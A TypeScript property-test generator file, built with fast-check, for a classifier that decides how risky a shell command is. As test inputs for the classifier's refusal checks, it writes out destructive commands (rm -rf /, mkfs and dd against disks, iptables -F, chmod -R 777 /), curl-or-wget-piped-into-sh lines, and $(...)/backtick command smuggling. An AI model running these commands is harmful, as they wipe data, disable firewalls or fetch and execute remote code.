import fc from 'fast-check';

/**
 * Generators for the classifier properties.
 *
 * Plain `fc.string()` almost never produces a command a shell would run, so a property
 * over it says nothing about classification. These are built from the parts a command is
 * made of — reader binaries, flags, paths, interpreters, separators, quotes,
 * substitutions, privilege prefixes, operand-free wrappers, never-allowed shapes — plus
 * short free strings, in the style of `test/property/sanitizer.property.test.ts`. Every
 * generator closes the quotes and substitutions it opens by construction, never by
 * filtering: an unclosed quote changes how the rest of the string reads, and a
 * "composition lowered the class" failure caused by the generator would be noise.
 *
 * Each closed-command generator produces at most two shell segments, so a property that
 * joins two of them with a separator stays within the design's four-segment cap, and
 * nothing here contains `)` except the closer of a `$( … )` it opened, which lets the
 * sanity test check the balance by counting. Raw control characters are never written
 * literally; the control-character vocabulary below spells them as escapes.
 */

/** Reader binaries the classifier vouches for, copied from its table as a literal. */
const READER_BINARIES = [
  'arp', 'basename', 'cat', 'comm', 'cut', 'date', 'df', 'diff', 'dig', 'dirname', 'du',
  'echo', 'false', 'file', 'find', 'free', 'grep', 'head', 'host', 'hostname', 'htop',
  'id', 'ifconfig', 'iostat', 'journalctl', 'ls', 'netstat', 'nslookup', 'ping',
  'printenv', 'printf', 'ps', 'pwd', 'readlink', 'realpath', 'seq', 'sort', 'ss', 'stat',
  'tail', 'test', 'top', 'tr', 'traceroute', 'true', 'uname', 'uniq', 'uptime', 'vmstat',
  'wc', 'whereis', 'which', 'who', 'whoami',
];

/** Two-word reader names, which the classifier matches as a unit before any argument. */
const TWO_WORD_READERS = [
  'docker images', 'docker inspect', 'docker logs', 'docker ps', 'docker stats',
  'git branch', 'git diff', 'git log', 'git remote', 'git show', 'git status',
  'ip addr', 'ip route', 'systemctl status',
];

/** Short flags a reader might take; an unlisted one exercises the grammar rejection. */
const READER_FLAGS = [
  '-l', '-la', '-a', '-h', '-n', '-r', '-v', '-u', '-e', '-c', '--all', '--help',
  '--verbose', '--color=auto', '-name', '-type',
];

/** Short paths used as operands, kept short so composed commands stay under ~200 chars. */
const PATHS = [
  '.', '/tmp', '/srv', '/root', '/etc/hosts', '/etc/passwd', '/var/log', '/home/u',
  'notes.txt', 'a/b',
];

/** Binaries that change something, from `safe` to `destructive`. */
const MUTATOR_BINARIES = [
  'touch', 'mkdir', 'cp', 'mv', 'chmod', 'chown', 'rm', 'kill', 'systemctl', 'apt-get',
  'git', 'tee', 'tar',
];

/** Flags and fixed operands a mutator might take before or between its paths. */
const MUTATOR_FLAGS = [
  '-rf', '-fr', '-r', '-R', '-f', '-p', '-n', '-y', '--recursive', 'restart', 'stop',
  'start', 'install', 'pull', '777', '600', 'a+w', 'app:app',
];

/** The interpreter calls that hand a program to an interpreter, flag spellings included. */
const INTERPRETER_CALLS = [
  'sh -c', 'bash -c', 'dash -c', 'zsh -c', 'python -c', 'python3 -c', 'node -e',
  'node -p', 'perl -e', 'ruby -e', 'php -r', 'osascript -e',
];

/** Programs the classifier can read: shell text, so the class is the inner command's. */
const SHELL_PROGRAMS = ['id', 'ls /tmp', 'uptime', 'true', 'echo hi'];

/** Programs the classifier cannot read: their presence alone makes the call destructive. */
const OPAQUE_PROGRAMS = ['1', 'pass', 'print 1', 'import os', 'x=1'];

/** The privilege prefixes, copied from the classifier as a literal. */
export const PRIVILEGE_PREFIXES = [
  'sudo', 'su', 'doas', 'pkexec', 'su-exec', 'gosu', 'sudo-rs', 'run0', 'pfexec',
  'runuser', 'setpriv',
];

/**
 * Wrappers that take no operand before the command they run; `env`/`nice`/`stdbuf` also
 * show their assignment/flag forms. A wrapper that needs an operand of its own before
 * the command (a duration, a priority, a path) is outside this vocabulary: the
 * invariant's premise — prefix the command with an exec wrapper that takes no operand —
 * does not hold for that shape.
 */
export const OPERAND_FREE_WRAPPERS = [
  'env', 'env A=1', 'nohup', 'nice', 'nice -5', 'ionice', 'command', 'exec', 'setsid',
  'stdbuf', 'stdbuf -oL', 'xargs', 'watch', 'busybox',
  'strace', 'ltrace', 'valgrind', 'time',
];

/**
 * The classifier's shell control characters, copied as a literal (spelled with escapes):
 * this pins the documented refusal, not a general theory of shell-special characters.
 */
export const SHELL_CONTROL_CHARS = [...';&|<>`$(){}\n\r'];

/**
 * The characters that make quoting a word change what the shell runs, or what this
 * classifier reads: glob characters (quoting stops the expansion), whitespace and the
 * separators (the word stops being split or sequenced), `$` and backtick (substitution),
 * parentheses and braces (a word ending in a substitution's `)` would swallow its closer),
 * a backslash (escape), `=` (a quoted `NAME=value` is no longer an assignment; any `=` is
 * excluded, which also leaves `--flag=value` unquoted), and the quote characters
 * themselves (wrapping a word that already carries one would leave the variant's quotes
 * unbalanced). A leading `~` is excluded by the word check: quoted, it is no longer
 * expanded.
 */
const UNQUOTABLE_IN_WORD = /[*?[\]\s;&|<>`$(){}\\='"]/;

/** Whether quoting `word` cannot change what the shell runs; one definition shared by the generator and the property. */
export function isQuotableWord(word: string): boolean {
  return word.length > 0 && !word.startsWith('~') && !UNQUOTABLE_IN_WORD.test(word);
}

/**
 * Characters a free word may be built from; none of them opens a quote or a substitution,
 * and `#` is left out because a word starting with it begins a shell comment.
 */
const WORD_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_./%@+:-'.split('');

/** Characters that additionally make a word a glob pattern. */
const GLOB_CHARS = [...WORD_CHARS, '*', '?', '[', ']'];

/** A short free word that quoting cannot change: the quotable-word definition, built by construction. */
export const quotableWord = fc.string({
  minLength: 1,
  maxLength: 10,
  unit: fc.constantFrom(...WORD_CHARS),
});

/** A short free word that may carry glob characters, so the glob-rejection path is reached. */
const globWord = fc.string({ minLength: 1, maxLength: 10, unit: fc.constantFrom(...GLOB_CHARS) });

/** A path wrapped in one pair of quotes, so argument-quoting appears in plain commands. */
const quotedPath = fc
  .constantFrom(...PATHS)
  .map((p) => `'${p}'`);

/** The ways a shell joins two commands into one line: sequence, both, either, pipe, newline. */
export const separator = fc.constantFrom(';', '&&', '||', '|', '\n');

/** A prefix word that still names the prefix: bare, path-qualified, quoted, or backslash-escaped. */
export const privilegePrefix = fc
  .constantFrom(...PRIVILEGE_PREFIXES)
  .chain((p) => fc.constantFrom(p, `/usr/bin/${p}`, `./${p}`, `'${p}'`, `"${p}"`, `\\${p}`));

/** One operand-free wrapper spelling, from the classifier's own wrapper set. */
export const operandFreeWrapper = fc.constantFrom(...OPERAND_FREE_WRAPPERS);

/**
 * Wrappers spelled with the words they take before the command they run: an operand
 * (a lockfile, a directory, a mask, a subcommand, a duration) and the flags whose value
 * is a word of its own. The words are ordinary ones, so the invariant is the same as for
 * the operand-free set: what runs behind them classifies at least as high as it does alone.
 */
export const OPERAND_WRAPPERS = [
  'flock /tmp/lk', 'flock -x /tmp/lk', 'flock -w 5 /tmp/lk', 'flock --wait 5 /tmp/lk', 'flock -E 1 /tmp/lk',
  'chroot /mnt', 'chroot --userspec root /mnt', 'chroot --groups 10 /mnt',
  'taskset 0x1', 'taskset -c 0', 'taskset -c 0-3', 'perf stat', 'perf record',
  'timeout 5', 'timeout 2m30s', 'timeout -s KILL 5', 'timeout -k 5 10',
  'strace -o /tmp/t', 'strace -u root', 'ltrace -u root', 'env -u HOME', 'env -C /tmp',
  'ionice -c idle', 'xargs -I {}', 'xargs -p', 'xargs -r', 'time -p', 'nice -n 5',
];

/** One wrapper-with-operand spelling. */
export const operandWrapper = fc.constantFrom(...OPERAND_WRAPPERS);

/** One argument a command word might take, with no substitution in it. */
const plainArg = fc.oneof(
  { weight: 3, arbitrary: fc.constantFrom(...PATHS) },
  { weight: 2, arbitrary: fc.constantFrom(...READER_FLAGS) },
  { weight: 2, arbitrary: quotableWord },
  { weight: 1, arbitrary: globWord },
  { weight: 1, arbitrary: quotedPath },
);

/** A short command with no substitution of its own, for a substitution to carry. */
const atom = fc
  .tuple(
    fc.oneof(
      { weight: 3, arbitrary: fc.constantFrom(...READER_BINARIES) },
      { weight: 2, arbitrary: fc.constantFrom(...MUTATOR_BINARIES) },
      { weight: 1, arbitrary: privilegePrefix },
    ),
    fc.array(plainArg, { maxLength: 1 }),
  )
  .map(([head, args]) => [head, ...args].join(' '));

/** An argument that hands a second command to the shell: `$(…)`, backticks, or a quoted `$(…)`. */
const substitutionArg = fc
  .tuple(atom, fc.constantFrom<'$' | '"' | '`'>('$', '"', '`'))
  .map(([inner, kind]) =>
    kind === '$' ? `$(${inner})` : kind === '"' ? `"$(${inner})"` : `\`${inner}\``);

/** Any argument, substitutions rare: most arguments are data, but some carry a command. */
const arg = fc.oneof(
  { weight: 8, arbitrary: plainArg },
  { weight: 1, arbitrary: substitutionArg },
);

/** A reader's command name: a one-word binary, or a two-word name matched as a unit. */
const readerName = fc.oneof(
  { weight: 4, arbitrary: fc.constantFrom(...READER_BINARIES) },
  { weight: 2, arbitrary: fc.constantFrom(...TWO_WORD_READERS) },
);

/** A reader invocation assembled from parts: binary, flags, paths, quoted and free words. */
const readerInvocation = fc
  .tuple(readerName, fc.array(arg, { maxLength: 2 }))
  .map(([binary, args]) => [binary, ...args].join(' '));

/** A mutating invocation assembled from parts, from `safe` up to the destructive floor. */
const mutatorInvocation = fc
  .tuple(
    fc.constantFrom(...MUTATOR_BINARIES),
    fc.array(
      fc.oneof(
        { weight: 3, arbitrary: fc.constantFrom(...PATHS) },
        { weight: 2, arbitrary: fc.constantFrom(...MUTATOR_FLAGS) },
        { weight: 1, arbitrary: quotableWord },
      ),
      { maxLength: 3 },
    ),
  )
  .map(([binary, args]) => [binary, ...args].join(' '));

/** An interpreter with a quoted program, readable or opaque, closed by construction. */
const interpretedInvocation = fc
  .tuple(
    fc.constantFrom(...INTERPRETER_CALLS),
    fc.constantFrom(...SHELL_PROGRAMS, ...OPAQUE_PROGRAMS),
    fc.constantFrom("'", '"'),
  )
  .map(([call, program, quote]) => `${call} ${quote}${program}${quote}`);

/** A command behind a privilege prefix, or the bare prefix with nothing after it. */
const elevatedInvocation = fc
  .tuple(privilegePrefix, fc.oneof(readerInvocation, mutatorInvocation, fc.constant('')))
  .map(([prefix, command]) => `${prefix} ${command}`.trim());

/** One command with no separator in it, of any class. */
export const simpleCommand = fc.oneof(
  { weight: 4, arbitrary: readerInvocation },
  { weight: 3, arbitrary: mutatorInvocation },
  { weight: 1, arbitrary: interpretedInvocation },
  { weight: 2, arbitrary: elevatedInvocation },
);

/** One segment, alias `simpleCommand`: the composition generator builds on this name. */
const plainAtom = simpleCommand;

/** Never-allowed shapes as parts, so flag order and spelling vary: `rm -fr /` is `rm -rf /`. */
const neverAllowedTemplates = fc.oneof(
  fc
    .tuple(fc.constantFrom('shutdown', 'reboot', 'halt', 'poweroff'),
      fc.constantFrom('', '-h now', 'now', '-r', '-f'))
    .map(([bin, flags]) => [bin, flags].filter(Boolean).join(' ')),
  fc
    .tuple(fc.constantFrom('rm'),
      fc.constantFrom('-rf', '-fr', '-r', '-R', '-f --recursive', '--recursive -f', '-r -f'),
      fc.constantFrom('/', '//', '/.', '/..', '/etc/..', '/./', '//..'))
    .map(([rm, flags, target]) => `${rm} ${flags} ${target}`),
  fc.constantFrom(
    'mkfs.ext4 /dev/sdb1', 'mkfs -t ext4 /dev/sda1', 'mke2fs /dev/sdc', 'mkswap /dev/sdd',
    'wipefs /dev/sde', 'dd if=/dev/zero of=/dev/sda', 'dd of=/dev/sdb',
    'iptables -F', 'ip6tables --flush', 'iptables -P INPUT ACCEPT', 'nft flush ruleset',
    'chmod -R 777 /', 'chmod --recursive 0777 /etc', 'chmod -R a+w /srv',
    'chown -R app:app /', 'chown --recursive u:u /etc/..',
  ),
);

/**
 * Never-allowed shapes whose backslash is the point: a target shell may read it as a
 * path separator (cmd.exe), and the never-allowed check reads both ways. Each entry
 * matches `findForbiddenMatch`, and the POSIX reading catches these too.
 */
const neverAllowedBackslash = fc.constantFrom(
  '\\shutdown -h now', '\\reboot', '\\halt', '\\poweroff',
  '\\\\shutdown -h now', '\\\\reboot', '\\\\iptables -F', '\\\\mkfs.ext4 /dev/sdb1',
  'mkfs.ext4 \\\\dev\\\\sdb1',
);

/**
 * Never-allowed commands named by a Windows path to the binary: only the cmd.exe reading
 * catches these, so a property that counts them shows that reading is exercised.
 */
const neverAllowedWindowsPath = fc.constantFrom(
  'tools\\shutdown -h now', 'C:\\bin\\reboot', 'D:\\x\\mkfs.ext4 /dev/sdb1',
);

/** A single-segment command from the never-allowed list, plain or backslash-spelled. */
const neverAllowedSegment = fc.oneof(
  { weight: 6, arbitrary: neverAllowedTemplates },
  { weight: 3, arbitrary: neverAllowedBackslash },
  { weight: 3, arbitrary: neverAllowedWindowsPath },
);

/** A command that carries another through `$(…)`, backticks or a quoted `$(…)`, one level deep. */
const substitutionCarrier = fc.oneof(
  fc
    .tuple(fc.constantFrom('echo', 'ls', 'cat', 'printf'), atom)
    .map(([outer, inner]) => `${outer} $(${inner})`),
  fc
    .tuple(fc.constantFrom('echo', 'ls', 'cat'), atom)
    .map(([outer, inner]) => `${outer} \`${inner}\``),
  fc
    .tuple(fc.constantFrom('echo', 'printf'), atom)
    .map(([outer, inner]) => `${outer} "$(${inner})"`),
);

/** A command run through an operand-free wrapper: the wrapper must not hide what runs. */
const wrappedSegment = fc
  .tuple(operandFreeWrapper, plainAtom)
  .map(([wrapper, command]) => `${wrapper} ${command}`);

/** One shell segment: any single command, never containing a separator. */
const segment = fc.oneof(
  { weight: 12, arbitrary: plainAtom },
  { weight: 4, arbitrary: neverAllowedSegment },
  { weight: 2, arbitrary: substitutionCarrier },
  { weight: 2, arbitrary: wrappedSegment },
);

/**
 * A download piped into a shell — the never-allowed shape that is two segments by
 * nature, so it appears whole rather than inside a segment and is counted as two.
 */
const pipeIntoShell = fc
  .tuple(
    fc.constantFrom('curl http://example.com/x', 'curl -sL http://10.0.0.1/p.sh',
      'wget http://example.com/y'),
    fc.constantFrom('sh', 'bash', 'zsh'),
  )
  .map(([download, shell]) => `${download} | ${shell}`);

/**
 * One or two segments joined by a separator, or a two-segment pipe into a shell: at most
 * two segments, so a property joining two of these stays within the four-segment cap.
 */
export const closedCommand = fc.oneof(
  { weight: 4, arbitrary: segment },
  {
    weight: 2,
    arbitrary: fc.tuple(segment, separator, segment).map(([a, s, b]) => `${a} ${s} ${b}`),
  },
  { weight: 1, arbitrary: pipeIntoShell },
);

/**
 * A reader invocation with one shell control character inserted strictly between two of
 * its words, so the read-only refusal is exercised for every character of the copied
 * set; the character travels with the command so a property can count which ones it has
 * seen. Leading or trailing `\n`/`\r` would be plain whitespace, trimmed away before
 * anything reads it — the command that remains is genuinely the reader on its own.
 */
export const readerWithControlChar: fc.Arbitrary<{ command: string; controlChar: string }> = fc
  .tuple(
    fc
      .tuple(readerName, fc.array(arg, { minLength: 1, maxLength: 2 }))
      .map(([binary, args]) => [binary, ...args].join(' ')),
    fc.integer({ min: 0, max: 3 }),
    fc.constantFrom(...SHELL_CONTROL_CHARS),
  )
  .map(([reader, position, ch]) => {
    const words = reader.split(' ');
    const at = 1 + Math.min(position, words.length - 2);
    return {
      command: [...words.slice(0, at), ch, ...words.slice(at)].join(' '),
      controlChar: ch,
    };
  });

/**
 * Arbitrary text up to 200 units: printable strings, any well-formed code point
 * including control characters (fast-check's `binary` unit never yields a lone
 * surrogate), and runs of the shell tokens the classifier splits on.
 */
export const anyString = fc.oneof(
  fc.string({ maxLength: 200 }),
  fc.string({ unit: 'binary', maxLength: 200 }),
  fc.array(fc.constantFrom('"', "'", '`', '$(', ')', '\\', ';', '|', '&', '\n', ' ', 'sudo', 'x'), { maxLength: 60 })
    .map((parts) => parts.join('')),
);
